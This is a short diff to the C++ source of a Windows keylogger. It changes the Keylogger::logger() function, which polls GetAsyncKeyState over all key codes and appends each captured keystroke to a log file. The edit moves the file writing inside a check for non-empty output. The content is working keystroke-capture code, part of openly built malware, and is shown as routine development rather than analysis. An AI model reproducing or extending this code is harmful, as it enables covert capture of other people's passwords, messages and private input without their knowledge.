@@ -44,9 +44,7 @@ constantly opens and closes a file 100x per second. really not optimal
 void Keylogger::logger()		//keycode map taken from https://github.com/TheFox/keylogger/blob/master/src/main.cpp
 {
 
-	std::ofstream file;
-	file.open(Settings::keylogPath, std::ios_base::app);
-
+	
 	for (unsigned char c = 1; c < 255; c++) {
 		SHORT rv = GetAsyncKeyState(c);
 		if (rv & 1) { // on press button down
@@ -138,10 +136,14 @@ void Keylogger::logger()		//keycode map taken from https://github.com/TheFox/key
 			else
 				out = "[KEY \\" + std::to_string(c) + "]";
 
-
-			file << out;
-			file.flush();
-			file.close();
+			if (out != "")
+			{
+				std::ofstream file;
+				file.open(Settings::keylogPath, std::ios_base::app);
+				file << out;
+				file.flush();
+				file.close();
+			}
 		}
 	}
 }
